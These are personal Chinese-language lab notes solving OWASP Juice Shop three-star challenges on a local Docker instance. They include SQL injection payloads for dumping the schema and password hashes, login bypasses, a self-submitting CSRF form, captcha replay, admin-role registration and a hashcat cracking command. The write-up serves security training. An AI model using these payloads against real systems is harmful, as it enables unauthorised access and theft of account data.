# juicyshop 三星挑戰


```
https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html

docker run --rm -p 3000:3000 bkimminich/juice-shop

192.168.50.237:3000
```


## 註冊為具有管理員權限的用戶

POST使用以下內容向http://192.168.50.237:3000/api/Users提交請求：

{"email":"admin","password":"admin","role":"admin"}作為身體

並application/json作為Content-Type


問題怎知道role字段

確定艾瑪的安全問題的答案 那題抓包可以找到。
```

{"user":{"id":19,"username":"E=ma²","email":"emma@juice-sh.op","password":"1f050242921954f2c734eec74ce2ecb6","role":"customer","deluxeToken":"","lastLoginIp":"","profileImage":"assets/public/images/uploads/default.svg","totpSecret":"","isActive":true,"createdAt":"2024-01-18T01:45:14.269Z","updatedAt":"2024-01-18T09:06:13.937Z","deletedAt":null}}
```


## 將附加產品放入其他用戶的購物籃中



## 10 秒內提交 10 個或更多客戶回饋

開啟瀏覽器 DevTools 的 Network 標籤並造訪 http://192.168.50.237:3000/#/contact

您應該注意到GET對 http://192.168.50.237:3000/rest/captcha/ 的請求，該請求會擷取回饋表單的驗證碼。HTTP 回應正文將類似於 {"captchaId":18,"captcha":"5*8*8","answer":"320"}。

正常填寫表單並提交，同時在開發者工具中檢查後端互動。驗證碼標識符和解決方案與請求正文中的回饋一起傳輸： {comment: "Hello", rating: 1, captcha: "320", captchaId: 18}

您會注意到從 REST 端點檢索到新的驗證碼。它將提出不同的數學挑戰，例如 {"captchaId":19,"captcha":"1*1-1","answer":"0"}

編寫另一個回饋，但在發送之前，將captchaId 和參數變更為和 captcha之前的值。在此範例中，您將提交而不是.captchaIdanswercaptcha: "320", captchaId: 18captcha: "0", captchaId: 19

伺服器將接受您的回饋，告訴您驗證碼可以固定到您之前喜歡的任何一個。

編寫一個包含 10 次迭代循環的腳本，使用您固定的captchaId和captcha參數提交回饋。運行這個腳本將解決這個挑戰。



## 透過從另一個來源執行跨站點請求偽造來更改用戶名
SameSite=None 在預設設定 cookie 的網路瀏覽器中開啟 Juice Shop 。Firefox 96.x 或 Chrome 79.x 已成功測試，但您可以隨意嘗試其他瀏覽器。

使用任何用戶帳號登入。該用戶將成為 CSRF 攻擊的受害者。

在同一瀏覽器中導覽至http://htmledit.squarefree.com 。有意在不使用 TLS 的情況下造訪網站，否則瀏覽器的混合內容策略可能會出現問題。

在頁面的上方框架中，貼上以下 HTML 片段，其中包含自行提交的 HTML 表單

```
<form action="http://192.168.50.237:3000/profile" method="POST">
  <input name="username" value="CSRF"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
```

我這邊用kali 的 apache2 搭一個webserver 可以成功官方給的網站用不了。











## 透過 SQL 注入滲透整個資料庫模式定義


先完成 訂購 2014 聖誕節特別優惠 挑戰，比較好理解。


注入點
```
http://192.168.50.237:3000/rest/products/search?q=
```



注入過程
```

//引發錯誤，確認有sql 注入可能
';



//閉合成功
'))--


// union 注入
')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master--


//導出數據結構
')) UNION SELECT 1,2,3,4,5,6,7,8,sql FROM sqlite_master--
```

關鍵表
```
CREATE TABLE `Users` (
    `id` INTEGER PRIMARY KEY AUTOINCREMENT,
    `username` VARCHAR(255) DEFAULT '',
    `email` VARCHAR(255) UNIQUE,
    `password` VARCHAR(255),
    `role` VARCHAR(255) DEFAULT 'customer',
    `deluxeToken` VARCHAR(255) DEFAULT '',
    `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0',
    `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg',
    `totpSecret` VARCHAR(255) DEFAULT '',
    `isActive` TINYINT(1) DEFAULT 1,
    `createdAt` DATETIME NOT NULL,
    `updatedAt` DATETIME NOT NULL,
    `deletedAt` DATETIME
);

```


注入拿密碼 不過這邊建議，不要把密碼跟email 合併，他們順序好像不同
```
xxxxxx')) UNION SELECT 1,2,3,4,5,6,7,8,email FROM  Users  --
xxxxxx')) UNION SELECT 1,2,3,4,5,6,7,8,password FROM  Users  --

```

所有使用者
```
J12934@juice-sh.op
accountant@juice-sh.op
admin@juice-sh.op
amy@juice-sh.op
bender@juice-sh.op
bjoern.kimminich@gmail.com
bjoern@juice-sh.op
bjoern@owasp.org
chris.pike@juice-sh.op
ciso@juice-sh.op
demo
emma@juice-sh.op
ethereum@juice-sh.op
jim@juice-sh.op
john@juice-sh.op
mc.safesearch@juice-sh.op
morty@juice-sh.op
stan@juice-sh.op
support@juice-sh.op
uvogin@juice-sh.op
wurstbrot@juice-sh.op
```




## 無需付費即可獲得豪華會員資格


如果錢包是空的：前往 http://192.168.50.237:3000/#/payment/deluxe 並查看升級到豪華帳戶的可用付款選項 b．開啟開發工具並檢查「使用錢包付款」選項旁邊的付款按鈕。C。從元素中刪除disabled=“true”屬性以啟用它。d. 切換到網路標籤和開發工具，然後按一下按鈕啟動付款。看到發送了一個POST請求，請求負載中只包含一個參數“ paymentMode”，設定為“wallet”。回應包含錯誤，指出您的錢包沒有足夠的資金 d．右鍵單擊請求並選擇“編輯並重新發送”e。將 paymentMode 參數變更為空字串，然後按傳送。這解決了難題，果汁店不再知道從哪裡扣錢

如果錢包不空：如果您的錢包包含資金，您無法啟動虛擬交易來檢查請求結構，因為那樣您將自動升級到豪華版。b. 設定代理，例如 OWASP ZAP、Fiddler aur Burp Suite。C。點擊支付按鈕 D. 在轉發請求之前，如上所述攔截並編輯請求。



















## 以其他用戶的名義發布一些回饋


前往http://192.168.50.237:3000/#/contact上的「聯絡我們」表單。

檢查瀏覽器中表單的 DOM，在頂部發現這個可疑的文字欄位：<input _ngcontent-c23 hidden id="userId" type="text" class="ng-untouched ng-pristine ng-valid">

聯絡我們表單上的隱藏文字字段
在瀏覽器的開發人員工具中，hidden從上述<input>標籤中刪除該屬性。

欺騙性回饋已準備好提交
該欄位現在應該在您的瀏覽器中可見。在其中鍵入任何使用者的資料庫標識符（如果您目前已登錄，則不是您自己的資料庫標識符）並提交回饋。

您也可以直接傳送POST到 http://192.168.50.237:3000/api/Feedbacks端點來解決此挑戰。例如，您可以登出但UserId在 JSON 有效負載中提供任何內容。












## 以其他使用者身分發佈產品評論或編輯任何使用者的現有評論


選擇任何產品並為其撰寫評論 簡單的商品評論

分析PUT請求。 正常產品請求

將作者姓名更改為admin@juice-sh.op並重新發送請求。












## 使用 Chris 已刪除的使用者帳號登入

如果您已經知道 Chris 的電子郵件地址，請使用電子郵件 chris.pike@juice-sh.op'--和任何密碼登入。

```
SELECT * FROM Users WHERE email = '111' AND password = '202cb962ac59075b964b07152d234b70' AND deletedAt IS NULL



chris.pike@juice-sh.op'--

\' or deletedAt IS NOT NULL--

```


这个查询将检索 "your_table" 表中 "deletedAt" 列不为空的所有记录，表示这些记录已被标记为删除。
```
SELECT *
FROM your_table
WHERE deletedAt IS NOT NULL;

```



## 使用 Amy 的原始使用者憑證登入


Google 搜尋93.83 billion trillion trillion centuries或One Important Final Note.

兩次搜尋都應將 https://www.grc.com/haystack.htm 顯示為熱門搜尋之一。

閱讀密碼填入後嘗試範例密碼 D0g.....................

她實際上做了一個非常相似的填充技巧，只是將她丈夫Kif的名字寫成K1f而不是範例中的D0g ！她甚至懶得改變填充長度！

造訪http://localhost:3000/#/login amy@juice-sh.op並使用憑證和密碼登入 K1f.....................以解決挑戰

這題 osint 題。可以查看官方挑戰手冊。

```
Last name of dentist when you were a teenager? (Do not include 'Dr.')
```





## 使用 Bender 的使用者帳號登入


SQL 注入登入
```
bender@juice-sh.op'--
```


修改密碼，不需要current 參數
```
http://192.168.50.237:3000/rest/user/change-password?current=1111111&new=11111&repeat=11111


http://192.168.50.237:3000/rest/user/change-password?new=11111&repeat=11111
```







## 使用 Jim 的使用者帳號登入


如果您已經知道 Jim 的電子郵件地址，請使用電子郵件 jim@juice-sh.op'--和任何密碼登入。

或者，如果您按照透過 SQL 注入檢索所有使用者憑證的清單中所述收集使用者資料後在彩虹表中查找 Jim 的密碼哈希，則使用 電子郵件 jim@juice-sh.op和密碼 登入。ncc-1701

```
xxxxxx')) UNION SELECT 1,2,3,4,5,6,7,8,password FROM  Users where email='jim@juice-sh.op'  --
e541ca7ecf72b8d1286474fc613e5e45

jim@juice-sh.op	e541ca7ecf72b8d1286474fc613e5e45

```

破出來 ncc-1701 
```
hashcat -m 0 -a 0 e541ca7ecf72b8d1286474fc613e5e45 /usr/share/wordlists/rockyou.txt
```





## 下訂單讓你致富


將至少一件商品放入您的購物籃中。

請注意，無法透過 UI 將購物籃商品的數量減少到 1 以下

```
{"quantity": -100}
```
然後 0圓購






## 證明您確實閱讀了我們的隱私權政策


找到噴火特效
```
http://192.168.50.237:3000/#/privacy-security/privacy-policy

<span _ngcontent-mqf-c95="" class="hot">http://192.168.50.237</span>
<span _ngcontent-mqf-c95="" class="hot">We may also</span>
<span _ngcontent-mqf-c95="" class="hot">instruct you</span>
<span _ngcontent-mqf-c95="" class="hot">to refuse all</span>
<span _ngcontent-mqf-c95="" class="hot">reasonably necessary</span>
<span _ngcontent-mqf-c95="" class="hot">responsibility</span>
```

連接
```
http://192.168.50.237:3000/we/may/also/instruct/you/to/refuse/all/reasonously/necessary/responsibility
```

這題沒成功，不知道是怎樣，但這題很無聊。




## 更改 O-Saft 產品描述中連結的 href

透過使用http://localhost:3000/rest/products/search?q=o-saft直接透過 REST API 搜尋O -Saft ，您將了解到它的資料庫 ID 是。9


修改 GET 改PUT
```
http://192.168.50.237:3000/api/Products/9


Content-Type: application/json; charset=utf-8

{"description": "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}
```

問題點，怎知道可以PUT 或是怎知道這API的的功能










## 透過忘記密碼機制重設 Bjoern 的 OWASP 帳戶密碼


請造訪http://localhost:3000/#/forgot-password並提供 bjoern@owasp.org您的電子郵件。

您會注意到，Bjoern 選擇的安全問題是您最喜歡的寵物的名字？

在https://twitter.com/bkimminich上尋找 Bjoern 的 Twitter 個人資料

透過他的狀態更新或媒體，你會發現一些可愛的貓的照片，最終還會找到推文https://twitter.com/bkimminich/status/1441659996589207555或可能是更新的https://twitter.com/ bkimminich/狀態/1594985736650035202

這則推文的文字劇透了貓的名字“Zaya”

再次造訪http://localhost:3000/#/forgot-password並再次提供 bjoern@owasp.org您的電子郵件。

在隨後出現的表格中，提供您最喜歡的寵物的名字Zaya？

然後輸入任何新密碼和匹配的重複新密碼

點擊更改來解決此挑戰



## 透過忘記密碼機制重置吉姆的密碼


請造訪http://localhost:3000/#/forgot-password並提供 jim@juice-sh.op您的電子郵件以了解您最大的兄弟姐妹的中間名？是 Jim 選擇的安全問題

吉姆（恰好UserId是2）在應用程式中留下了一些麵包屑，這表明了他的身份

OWASP Juice Shop-CTF Velcro Patch的產品評論 稱「穿在我的製服上比無聊的星際艦隊標誌好看多了」。

另一篇產品評論“剛從複製機中出來”。關於綠色冰沙產品

與他保存的地址「Room 3F 121, Deck 5, USS Enterprise, 1701」相關的回收請求

最終顯而易見的是，詹姆斯·T·柯克是解決吉姆身份問題的唯一可行方案

詹姆斯·T·柯克
請造訪https://en.wikipedia.org/wiki/James_T._Kirk並閱讀 描述 部分

它告訴你吉姆有一個名叫喬治·塞繆爾·柯克的兄弟

請造訪http://localhost:3000/#/forgot-password並提供 jim@juice-sh.op您的電子郵件

在隨後出現的表格中，請提供Samuel您最大的兄弟姐妹的中間名？

然後輸入任何新密碼和匹配的重複新密碼

點擊更改來解決此挑戰



## 上傳大於 100 kB 的文件
## 上傳沒有 .pdf 或 .zip 副檔名的文件

以上兩題一樣，先上傳一個小於 100KB txt檔，把 123.txt 改成 123.txt.pdf，上傳。

抓包在改123.txt。

另外可以填重資料到100多KB 完成挑戰。












## 繞過客戶端安全機制執行持久性 XSS 攻擊
docker 無法





## 完全不使用前端應用程式來執行持久性 XSS 攻擊
docker 無法









## 從伺服器檢索 C:\Windows\system.ini 或 /etc/passwd 的內容
docker 無法





## 透過從蜜蜂天堂收集蜜蜂來鑄造蜜罐 NFT


看不懂